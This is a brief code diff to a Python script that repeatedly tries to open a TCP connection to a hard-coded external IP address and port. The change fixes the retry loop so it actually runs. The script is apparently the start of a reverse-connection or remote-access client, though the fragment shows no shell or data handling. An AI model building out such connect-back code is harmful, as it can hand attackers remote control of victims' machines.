@@ -2,13 +2,14 @@ import socket
 import requests
 import os
 
-connected = False
+
 
 HOST = "193.161.193.99"
 PORT = 31353
 
 def main():
-    while not connected == False:
+    connected = False
+    while not connected == True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((HOST, PORT))
